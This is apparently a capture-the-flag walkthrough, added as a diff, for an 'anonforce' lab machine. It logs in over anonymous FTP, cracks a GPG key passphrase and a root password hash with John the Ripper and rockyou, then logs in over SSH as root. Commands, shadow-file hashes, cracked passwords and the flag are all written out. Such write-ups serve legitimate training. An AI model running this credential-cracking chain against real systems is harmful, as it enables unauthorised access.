@@ -1,0 +1,240 @@
+------------------------------------------------------------------------------------------------------------------------------------
+
+NOTE:- 
+
+CMD:-gpg2john fgd.asc > dfhsdg
+
+This command is used to extract a hash from a PGP/GPG private key file (fgd.asc) so that it can be cracked using John the Ripper.
+🔍 Explanation:
+
+    gpg2john: A tool provided by John the Ripper that converts GPG private key files (usually .asc or .gpg) into crackable hash formats.
+
+    fgd.asc: The exported GPG private key in ASCII-armored format.
+
+    > dfhsdg: Saves the hash output into the file dfhsdg.
+    
+ 
+CMD :-ssh2john fgd.asc > dfhsdg
+
+is using the ssh2john utility from the John the Ripper suite. Here's what it does:
+Breakdown:
+
+    ssh2john: A tool that converts SSH private key files into a format that John the Ripper can understand and try to crack.
+
+    fgd.asc: This is your input file — an SSH private key (in this case, an ASCII-armored .asc file).
+
+    > dfhsdg: Redirects the output to a file called dfhsdg.   
+    
+    
+gpg:-
+
+gpg (GNU Privacy Guard) is a tool used for encryption, decryption, and digital signatures. It implements the OpenPGP standard and is commonly used to:
+
+    Encrypt files or messages securely.
+    Verify authenticity via signatures.
+    Share public keys for secure communication.
+
+🔑 Common Commands
+
+🔐 Encrypt a file
+gpg -e -r recipient@example.com file.txt
+
+Encrypts file.txt for the recipient (must have their public key).
+
+🔓 Decrypt a file
+gpg -d file.txt.gpg
+
+Decrypts an encrypted file (must have the private key).
+
+✍️ Sign a file
+gpg --clearsign file.txt
+
+Creates a signed version of the file to prove authorship.
+
+🔍 Verify a signature
+gpg --verify file.txt.asc
+
+🗝️ Generate a new key pair
+gpg --full-generate-key
+
+Follow the prompts (name, email, encryption strength).
+
+📥 Import a public key
+gpg --import publickey.asc
+
+📤 Export your public key
+gpg --export -a yourname@example.com > mykey.asc
+
+💡 Useful Notes
+
+    GPG uses asymmetric encryption (public/private key pair).
+    You can also use symmetric encryption with -c:
+
+gpg -c file.txt
+This asks for a passphrase instead of using a key. 
+
+------------------------------------------------------------------------------------------------------------------------------------
+
+STEP 1:-
+
+scanning the target we got 2 ports open 21 ftp and 22 ssh
+
+so we try to open ftp using username=anonymous password=[...] thats work 
+ftp [ip]
+here we download some file like user.txt and backup.pgp,etc...
+
+STEP 2:-
+
+CMD:-ls
+'Additional Tools'   backup.pgp   mozo-made-15.desktop   NetworkConfigs   private.asc   Tools user.txt
+
+CMD:-root@ip-10-10-190-137:~/Desktop# cat backup.pgp
+\ufffd\ufffd\ufffdbh\ufffd\ufffda)g\ufffdl=\ufffd\ufffd\ufffd\ufffd^\ufffd\ufffdQAx\ufffd~\ufffdNZI\ufffdp\ufffdJ\ufffd\ufffdQ	\ufffd;R`n<!7P["u\u0524\ufffdm9\ufffd\ufffd4
+:\ufffdqv\ufffdG\ufffdI^\ufffd\ufffd(W\ufffdY!S\ufffd\ufffdcE\ufffdh=8I\ufffd5.9\ufffdoW\ufffd\ufffd\ufffd\ufffd\ufffdv\ufffd\ufffd{Kq\ufffd\ufffd\ufffd\ufffd\ufffd[^\u96d6l(\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd4!\ufffd\ufffd	\ufffdG[\ufffd\ufffd\ufffdhW\ufffdaQ\ufffd\ufffd3i\ufffd[\ufffd\ufffd\u0679v\ufffd>\ufffd\ufffdJ/=8B\ufffd\ufffd\ufffd\ufffd\ufffd\ufffdF>\ufffd'At\ufffdc\ufffd\ufffdN\ufffd8\ufffd!\ufffdY\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd^x\ufffde\ufffd\ufffdp\ufffd\ufffd\u0583\ufffd|.v*\ufffdOag\u07fdb\ufffd,\ufffd\ufffd2\ufffd\ufffd]\u042d\ufffd6\ufffd.QkuX\ufffd\ufffd=X3\ufffde\ufffd\ufffd=2\ufffd}w\ufffd\ufffd|K\ufffdNR(h\ufffd\ufffdjLy\ufffd>\ufffdB\u07ae/\ufffd
+                                                               \ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffdC~\ufffd&\ufffd\ufffdr\ufffdP5\ufffdz\ufffd\ufffdtm`V\ufffd\ufffd\ufffd\ufffd%\u041fX9\ufffd\ufffd\ufffda\u0338\ufffd\ufffd\ufffdi\ufffd\ufffdtx\ufffd{L\ufffd!(\ufffdn\ufffd#\ufffd\ufffd7	\ufffd\ufffd=\ufffd\ufffd\ufffdO\ufffd
+\ufffda\ufffdU0*O\ufffd\ufffd\ufffd\ufffdVNZ\ufffd\ufffdw\ufffd\u0468\ufffdn\\ufffd\ufffdd60
+                           LTS>\ufffd/
+                                 VE\ufffd\ufffd\ufffdh\ufffd/n|$@nvR\ufffdT:\ufffd"\ufffd\u0545\ufffd\u02f7 I\ufffdz\ufffd0\ufffd$ \ufffd\ufffd{\ufffd0\ufffd\ufffd\ufffdX\ufffd\ufffd\ufffd\ufffd\ufffdeXJ\ufffdf\ufffd\ufffd\ufffd\ufffd[M[\ufffd.\ufffd
+
+THAN we open private.asc file and show the private.asc have ssh rsa key 
+
+STEP 3:-
+
+so i need to crack passphrase using john
+ 
+root@ip-10-10-190-137:~/Desktop# john private.asc --wordlist=/usr/share/wordlist/rockyou.txt
+Using default input encoding: UTF-8
+No password hashes loaded (see FAQ)
+
+here file encrypt in utf-8, so we convert key to decrytable hash file using ssh2john
+
+root@ip-10-10-190-137:~/Desktop# ssh2john private.asc > kkk
+ssh2john: command not found
+
+here  ssh2john is not working so we try gpg2john
+
+root@ip-10-10-190-137:~/Desktop# gpg2john private.asc > kkk
+File private.asc
+
+here we get file than using john we crack the passphrase
+
+root@ip-10-10-190-137:~/Desktop# john kkk --wordlist=/usr/share/wordlists/rockyou.txt
+Warning: detected hash type "gpg", but the string is also recognized as "gpg-opencl"
+Use the "--format=gpg-opencl" option to force loading these as that type instead
+Using default input encoding: UTF-8
+Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
+Cost 1 (s2k-count) is 65536 for all loaded hashes
+Cost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 2 for all loaded hashes
+Cost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 9 for all loaded hashes
+Will run 2 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+xbox360          (anonforce)
+1g 0:00:00:00 DONE (2025-06-28 06:37) 7.142g/s 6642p/s 6642c/s 6642C/s xbox360..sheena
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+
+here we got xbox360 passphrase for over encryptrd file.
+
+STEP 4:-
+                          
+HERE USING passphrase we access file
+                                     
+CMD:-root@ip-10-10-190-137:~/Desktop# gpg --import private.asc
+gpg: key B92CD1F280AD82C2: public key "anonforce <melodias@anonforce.nsa>" imported
+gpg: key B92CD1F280AD82C2: secret key imported
+gpg: key B92CD1F280AD82C2: "anonforce <melodias@anonforce.nsa>" not changed
+gpg: Total number processed: 2
+gpg:               imported: 1
+gpg:              unchanged: 1
+gpg:       secret keys read: 1
+gpg:   secret keys imported: 1
+
+
+CMD:-root@ip-10-10-190-137:~/Desktop# gpg --decrypt backup.pgp
+gpg: WARNING: cypher algorithm CAST5 not found in recipient preferences
+gpg: encrypted with 512-bit ELG key, ID AA6268D1E6612967, created 2019-08-12
+      "anonforce <melodias@anonforce.nsa>"
+root:$6$07nYFaYf$F4VMaegmz7dKjsTukBLh6cP01iMmL7CiQDt1ycIm6a.bsOIBp0DwXVb9XI2EtULXJzBtaMZMNd2tV4uob5RVM0:18120:0:99999:7:::
+daemon:*:17953:0:99999:7:::
+bin:*:17953:0:99999:7:::
+sys:*:17953:0:99999:7:::
+sync:*:17953:0:99999:7:::
+games:*:17953:0:99999:7:::
+man:*:17953:0:99999:7:::
+lp:*:17953:0:99999:7:::
+mail:*:17953:0:99999:7:::
+news:*:17953:0:99999:7:::
+uucp:*:17953:0:99999:7:::
+proxy:*:17953:0:99999:7:::
+www-data:*:17953:0:99999:7:::
+backup:*:17953:0:99999:7:::
+list:*:17953:0:99999:7:::
+irc:*:17953:0:99999:7:::
+gnats:*:17953:0:99999:7:::
+nobody:*:17953:0:99999:7:::
+systemd-timesync:*:17953:0:99999:7:::
+systemd-network:*:17953:0:99999:7:::
+systemd-resolve:*:17953:0:99999:7:::
+systemd-bus-proxy:*:17953:0:99999:7:::
+syslog:*:17953:0:99999:7:::
+_apt:*:17953:0:99999:7:::
+messagebus:*:18120:0:99999:7:::
+uuidd:*:18120:0:99999:7:::
+melodias:$1$xDhc6S6G$IQHUW5ZtMkBQ5pUMjEQtL1:18120:0:99999:7:::
+sshd:*:18120:0:99999:7:::
+
+here we find credential of root so we need to decrept hash and get password.
+
+root:$6$07nYFaYf$F4VMaegmz7dKjsTukBLh6cP01iMmL7CiQDt1ycIm6a.bsOIBp0DwXVb9XI2EtULXJzBtaMZMNd2tV4uob5RVM0:18120:0:99999:7:::
+
+STEP 5:-
+
+first we crete file using nano than paste hash into file.
+
+
+root@ip-10-10-190-137:~/Desktop# nano mmm
+root@ip-10-10-190-137:~/Desktop# cat mmm
+$6$07nYFaYf$F4VMaegmz7dKjsTukBLh6cP01iMmL7CiQDt1ycIm6a.bsOIBp0DwXVb9XI2EtULXJzBtaMZMNd2tV4uob5RVM0
+
+here we make file than we need to crack the hash using john
+
+root@ip-10-10-190-137:~/Desktop# john mmm -wordlist=/usr/share/wordlists/rockyou.txt
+Warning: detected hash type "sha512crypt", but the string is also recognized as "sha512crypt-opencl"
+Use the "--format=sha512crypt-opencl" option to force loading these as that type instead
+Using default input encoding: UTF-8
+Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
+Cost 1 (iteration count) is 5000 for all loaded hashes
+Will run 2 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+hikari           (?)
+1g 0:00:00:12 DONE (2025-06-28 06:43) 0.07861g/s 543.3p/s 543.3c/s 543.3C/s 111111111111111..bethan
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+
+here we succesfully completed over work and we got root password 
+username=root
+password=hikari
+than we using this credential open the sssh server.
+
+root@ip-10-10-190-137:~/Desktop# ssh root@10.10.76.172
+root@10.10.76.172's password: 
+Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-157-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+root@ubuntu:~# ls
+root.txt
+root@ubuntu:~# cat root.txt
+f706456440c7af4187810c31c6cebdce
+root@ubuntu:~# ^C
+root@ubuntu:~# Connection to 10.10.76.172 closed by remote host.
+Connection to 10.10.76.172 closed.
